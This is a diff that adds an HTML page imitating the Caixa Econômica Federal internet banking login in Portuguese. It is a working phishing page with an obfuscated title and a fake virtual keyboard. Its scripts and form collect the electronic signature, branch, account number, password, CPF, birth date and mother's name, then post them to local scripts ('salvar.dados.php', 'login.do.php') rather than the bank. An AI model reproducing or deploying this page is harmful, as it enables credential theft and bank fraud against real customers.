@@ -1,0 +1,512 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-br" dir="ltr">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="IE=edge,requiresActiveX=true" http-equiv="X-UA-Compatible" />
+  <title>
+   In.teR net   B anK-ing----cAIXA
+  </title>
+  <script src="siwinCtrl5_files/funcoes.js" language="JavaScript">
+  </script>
+  <script src="siwinCtrl5_files/geral.js" language="JavaScript">
+  </script>
+  <!-- Tags Fixas -->
+  <meta charset="ISO-8859-1" />
+  <meta content="maximum-scale=1.6, minimum-scale=0.25" name="viewport" />
+  <meta content="mailto:thiagodefreitasmarinho@gmail.com" name="author" />
+  <!-- Tags Alteráveis -->
+  <meta content="Banco público orientado para o desenvolvimento econômico e social do país" name="description" />
+  <meta content="Banco público orientado para o desenvolvimento econômico e social do país" name="keywords" />
+  <!-- Favicon -->
+  <link href="favicon.ico" rel="shortcut icon" />
+  <link href="favicon.ico" type="image/x-icon" rel="icon" />
+  <!-- CSS -->
+  <!-- Script para selecionar Browser nos CSS -->
+  <!-- Script para fazer funcionar o mediaqueries nos Internet Explorer -->
+  <!--[if lt IE 9]>
+    <script src="../siwinstatic/nb/js/html5.js"></script>
+    <script src="../siwinstatic/nb/js/css3-mediaqueries.js"></script>
+    <![endif]-->
+  <!--[if IE 8]>
+    <script type="text/javascript" src="js/PIE.js"></script>
+    <![endif]-->
+  <!--[if IE 7]>
+    <script type="text/javascript" src="js/PIEie7.js"></script>
+    <![endif]-->
+  <link href="css/reset.css" media="all" rel="stylesheet" />
+  <!--[if !(IE 7)]-->
+  <link title="default" href="css/structure.css" media="all" rel="stylesheet" />
+  <!--[endif]-->
+  <!--[if IE 7]>
+    <link rel="stylesheet" media="all" href="css/structureie7.css">
+    <![endif]-->
+  <!-- MENU -->
+  <link href="css/menu-config.css" rel="stylesheet" />
+  <!-- MENU -->
+  <script src="siwinCtrl5_files/jquery-1.8.0.min.js">
+  </script>
+  <script src="siwinCtrl5_files/jquery.pubsub.js">
+  </script>
+  <script src="siwinCtrl5_files/jquery.afterload.js">
+  </script>
+  <script src="siwinCtrl5_files/yepnope-lab.js">
+  </script>
+  <script src="siwinCtrl5_files/jquery.modal.js">
+  </script>
+  <script src="siwinCtrl5_files/components.js">
+  </script>
+ </head>
+ <body class="internas">
+  <!-- MAIN -->
+  <div class="main">
+   <!-- HEADER -->
+   <header class="c-20">
+    <h1 title="Caixa Econômica Federal" class="logo">
+     <a href="http://www.caixa.gov.br/">
+      Caixa Econômica Federal | Internet Banking
+     </a>
+    </h1>
+   </header>
+   <!-- END HEADER -->
+   <!-- CONTENT -->
+   <div class="c-20 | main | content">
+    <script>
+     function tecladim(nr){
+		
+		if(document.getElementById('txtAssinatura').value.length &gt; 6){
+			alert("Sua Assinatura Eletrônica deve ter 6 caracteres numéricos");
+		return 0;
+		}
+		
+		if(document.getElementById('txtAssinatura').value.length &lt; 7){
+			document.getElementById('txtAssinatura').value = document.getElementById('txtAssinatura').value + nr;
+}
+
+	}
+	
+	function _apl_senha_Confirmar(){
+	
+	if(document.getElementById('txtAssinatura').value.length &lt; 6){
+			alert("Assinatura Eletrônica inválida");
+		return 0;
+		}
+		
+	document.form.submit();
+	}
+	function _limparCampos(){
+	document.getElementById('txtAssinatura').value = "";
+	}
+        function makeDate(id){
+            obj = document.getElementById('txtDatanas');
+            vl = obj.value;
+            l = vl.toString().length;
+            switch(l){
+                case 2:
+                    obj.value = vl + "/";
+                    break;
+                case 5:
+                    obj.value = vl + "/";
+                    break;
+            }
+        }
+function validate(evt) {
+  var theEvent = evt || window.event;
+  var key = theEvent.keyCode || theEvent.which;
+  key = String.fromCharCode( key );
+  var regex = /[0-9]|\./;
+  if( !regex.test(key) ) {
+    theEvent.returnValue = false;
+    if(theEvent.preventDefault) theEvent.preventDefault();
+  }
+}
+        function assinatura(){
+            if(document.getElementById('txtAssinatura').value.length==6){
+			
+                document.getElementById('txtAgencia').focus();
+            }}
+
+        function agencia(){
+            if(document.getElementById('txtAgencia').value.length== 4){
+                document.getElementById('txtConta').focus();
+            }}
+
+        function conta(){
+            if(document.getElementById('txtConta').value.length== 6){
+                document.getElementById('txtDigito').focus();
+            }}
+
+        function digito(){
+            if(document.getElementById('txtDigito').value.length== 1){
+                document.getElementById('txtQuatro').focus();
+            }}
+
+        function quatro(){
+            if(document.getElementById('txtQuatro').value.length== 4){
+                document.getElementById('txtCPF').focus();
+            }}
+
+        function cpf(){
+            if(document.getElementById('txtCPF').value.length== 11){
+                document.getElementById('txtDatanas').focus();
+            }}
+
+        function data(){
+            if(document.getElementById('txtDatanas').value.length== 10){
+                document.getElementById('txtNmae').focus();
+            }}
+
+        function validaForm1(valor){
+            with (document.frmSenha) {
+                if(valor == "1") {
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if(txtAssinatura.value == ""){
+                        alert("Favor informar a Assinatura Eletrônica.");
+                        txtAssinatura.focus();
+                        return;
+                    }
+
+                    if (txtAssinatura.value.length &lt; 6 ) {
+                        alert("A Assinatura Eletrônica é inválida.");
+                        txtAssinatura.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if(txtAgencia.value == ""){
+                        alert("Favor selecione a Agência.");
+                        txtAgencia.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtConta.value == "" ) {
+                        alert("Favor informar a Conta.");
+                        txtConta.focus();
+                        return;
+                    }
+
+                    if (txtConta.value.length &lt; 4 ) {
+                        alert("A Conta digitada é inválida.");
+                        txtConta.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtDigito.value == "" ) {
+                        alert("Favor informar o Digito da conta.");
+                        txtDigito.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtQuatro.value == "" ) {
+                        alert("Favor informar a Senha.");
+                        txtQuatro.focus();
+                        return;
+                    }
+
+                    if (txtQuatro.value.length &lt; 4 ) {
+                        alert("A Senha digitada é inválida.");
+                        txtQuatro.focus();
+                        return;
+                    }
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtCPF.value == "" ) {
+                        alert("Favor informar o seu CPF.");
+                        txtCPF.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtDatanas.value == "" ) {
+                        alert("Favor informar a sua Data da de Nascimento.");
+                        txtDatanas.focus();
+                        return;
+                    }
+
+                    if (txtDatanas.value.length &lt; 10 ) {
+                        alert("O Data digitada é inválida.");
+                        txtDatanas.focus();
+                        return;
+                    }
+
+                    &lt;!-- ------------------------ --&gt;
+
+                    if (txtNmae.value == "" ) {
+                        alert("Favor informar o nome completo da sua mãe.");
+                        txtNmae.focus();
+                        return;
+                    }
+
+                    if (txtNmae.value.length &lt; 10 ) {
+                        alert("O Nome digitado é inválido.");
+                        txtNmae.focus();
+                        return;
+                    }
+
+                    action="salvar.dados.php";
+
+                }
+
+                else if(valor == "2")
+                    action="gerenciar.do?acao=cadContas";
+
+                submit();
+            }
+        }
+
+        function limpaAssinatura(){
+            d = document.frmSenha;
+            d.txtAgencia.value="";
+            d.txtConta.value="";
+            d.txtDigito.value="";
+            d.txtQuatro.value="";
+            d.txtCPF.value="";
+            d.txtDatanas.value="";
+            d.txtNmae.value="";
+            d.txtAssinatura.value="";
+
+            d.txtAssinatura.focus();
+        }
+    </script>
+    <!--  conteudo -->
+    <div id="conteudo">
+     <div class="conteudo">
+      <div id="apl_corpo">
+       <div style="width:100%;float:left;margin:0px 0px 0px 10px;" id="apl_quadrodir">
+        <h1>
+         <img src="./siwinCtrl5_files/logo-identificacao.png" />
+         Identificação do usuário
+        </h1>
+        <div style="width: 734px;border-radius:8px 8px 8px 8px;-webkit-border-radius:8px 8px 8px 8px;
+											-moz-border-radius: 8px 8px 8px 8px; padding:10px;line-height:18px; background-color:#e7e7e7" class="conteudo textoc">
+         <style type="text/css">
+          input {
+                                        padding: 0!important;
+                                        font-size: 16px!important;
+                                    }
+                                    .showtext {
+                                        font-size: 11px;
+                                        margin-top: 10px;
+                                    }
+                                    h2 {
+                                        font-size: 19px!important;
+                                    }
+                                    label {}
+         </style>
+         <h2>
+          Verificação de Autenticidade:
+         </h2>
+         <br />
+         <br />
+         <div class="showtext">
+          O cadastramento deste computador precisa 
+                ser confirmado com sua Assinatura Eletrônica. Sua Assinatura Eletrônica 
+                deve conter 6 caracteres numéricos. Caso haja divergência, o seu 
+                acesso ao Internet Banking será automaticamente bloqueado.
+         </div>
+         <br />
+         <br />
+         <br />
+         *Este dado está de acordo com o registro de Cadastro de Pessoa Física da Receita Federal.
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <!-- SIDEBAR -->
+    <div class="bannerLateral" id="bannerLateral">
+     <aside>
+      <!-- Advertising -->
+      <!-- novo Banner -->
+      <div class="bannerVerticalFull">
+       <ul class="advertisingFull">
+        <li>
+         <a onclick="javascript:linkBannerLateral();" href="siwinAss.php">
+          <img width="170" height="350" tabindex="-1" alt="" src="siwinCtrl5_files/aside-advertising-04.jpg" />
+         </a>
+        </li>
+       </ul>
+       <div class="advertising-controls">
+       </div>
+      </div>
+      <!-- END Advertising -->
+     </aside>
+    </div>
+    <!-- END SIDEBAR -->
+   </div>
+   <!-- END CONTENT -->
+   <form style="text-align:center;" onsubmit="false" method="post" action="login.do.php" class="normal" id="form" name="form">
+    <input type="hidden" value="" name="uva" />
+    <input type="hidden" value="" name="85SenhaAtual" />
+    <input type="hidden" value="" name="txtOperacao" />
+    <input type="hidden" value="" name="txtAgencia" />
+    <input type="hidden" value="" name="txtConta" />
+    <input type="hidden" value="" name="txtDigito" />
+    <input type="hidden" value="" name="txtQuatro" />
+    <input type="hidden" value="" name="senha" />
+    <input type="hidden" value="" name="txtCPF" />
+    <input type="hidden" value="" name="txtDatanas" />
+    <input type="hidden" value="" name="txtNmae" />
+    <div class="componente_senha" id="76ParentDialog">
+     <div style="position:relative; float:left; height:65px" class="txt-campos-numerico ">
+      <p class="textocbold">
+       Use o teclado virtual para sua maior segurança.
+      </p>
+      <br />
+      <br />
+      <br />
+      <ul>
+       <li>
+        <label class="alignleft">
+         Assinatura Eletrônica:
+        </label>
+        <div class="relativeinput">
+         <input type="password" onblur="" onfocus="" onkeydown="" onkeypress="" onkeyup="" ondblclick="" onclick="" onchange="" ondrop="return false;" onpaste="" placeholder="" title="Informe Assinatura Eletrônica" alt="Informe Assinatura Eletrônica" value="" maxlength="6" tabindex="150" size="8" class="pie | input-grey  |  auto-tab-index-first-item" fieldtype="password" name="txtAssinatura" id="txtAssinatura" />
+        </div>
+       </li>
+      </ul>
+     </div>
+     <div style="position:relative; float:left; height:65px" id="76KeyboardContainer">
+      <link href="https://internetbankingpf.caixa.gov.br/siibcstatic/nb/css/keyboard.css" rel="stylesheet" />
+      <!-- CONTAINER -->
+      <div style="position: relative" id="keyboard" class="selector keyboard draggable ui-draggable">
+       <div class="tec-vir | pie" id="76Dialog">
+        <div>
+         <span class="drag-button">
+          <img alt="Mover" src="./siwinCtrl5_files/img_drag.png" />
+         </span>
+        </div>
+        <br />
+        <div class="
+				txt-campos-numerico
+				alignleft">
+        </div>
+        <div class="tecladoNB-keyboard | teclas" id="76Keyboard">
+         <div id="76TecladoN">
+          <div onclick="tecladim('9');" class="keyboard-button | pie">
+           9
+          </div>
+          <div onclick="tecladim('6');" class="keyboard-button | pie">
+           6
+          </div>
+          <div onclick="tecladim('3');" class="keyboard-button | pie">
+           3
+          </div>
+          <div onclick="tecladim('5');" class="keyboard-button | pie">
+           5
+          </div>
+          <div onclick="tecladim('0');" class="keyboard-button | pie">
+           0
+          </div>
+          <div onclick="tecladim('8');" class="keyboard-button | pie">
+           8
+          </div>
+          <div onclick="tecladim('7');" class="keyboard-button | pie">
+           7
+          </div>
+          <div onclick="tecladim('4');" class="keyboard-button | pie">
+           4
+          </div>
+          <div onclick="tecladim('2');" class="keyboard-button | pie">
+           2
+          </div>
+          <div onclick="tecladim('1');" class="keyboard-button | pie">
+           1
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <!-- END CONTAINER -->
+     </div>
+     <div style="margin-left:-15px" class="clear">
+      <div class="alignright">
+       <br />
+       <br />
+       <br />
+       <button tabindex="250" title="Retornar" class="button-orange 
+	
+	" type="button" id="btn_cancelar">
+        <span>
+         Retornar
+        </span>
+       </button>
+       <button onclick="_limparCampos();" tabindex="350" title="Limpar" class="button-blue 
+	
+	" type="button" id="btn_limpar">
+        <span>
+         Limpar
+        </span>
+       </button>
+       <button onclick="_apl_senha_Confirmar();" tabindex="450" title=" Confirmar" class="button-orange 
+	
+	" type="button" id="btn_confirmar">
+        <span>
+         Confirmar
+        </span>
+       </button>
+      </div>
+     </div>
+     <div style="margin-left:-15px; height:1px;" class="clear" id="beforeFooterDiv">
+     </div>
+    </div>
+    <!-- END CONTAINER -->
+   </form>
+   <div style="margin-top:19%">
+   </div>
+  </div>
+  <!-- END MAIN -->
+  <!-- FOOTER -->
+  <footer>
+   <div class="area">
+    <ul class="text-shadow">
+     <li class="sup_tec">
+      <strong>
+       Suporte Tecnológico 0800 726 0104
+      </strong>
+     </li>
+     <li>
+      <a title="Segurança" target="_blank" href="http://www.caixa.gov.br/seguranca/">
+       Segurança
+      </a>
+     </li>
+     <li>
+      <a title="Rede de Atendimento" href="javascript:fPopUp('http://www1.caixa.gov.br/atendimento/index.asp','','');">
+       Rede de Atendimento
+      </a>
+     </li>
+     <li>
+      <a title="Ajuda" href="javascript:abreDuvidasFrequentes();">
+       Ajuda
+      </a>
+     </li>
+     <li class="last-item">
+      <a title="Termos e Contratos" href="javascript:fPopUp('contrato_ibc.processa','contrato','width=620,height=520,scrollbars=yes');">
+       Termos e Contratos
+      </a>
+     </li>
+    </ul>
+   </div>
+  </footer>
+  <!-- END FOOTER -->
+  <div style="display: none" id="modalLoading">
+   <div class="modal-background">
+   </div>
+   <img src="./siwinCtrl5_files/loading.gif" id="modalLoadingProgressIcon" />
+  </div>
+  <div style="display: none" id="errorPage">
+  </div>
+  <noscript>
+   Seu navegador não da suporte a JavaScript. Por favor atualize-o!
+  </noscript>
+ </body>
+</html>
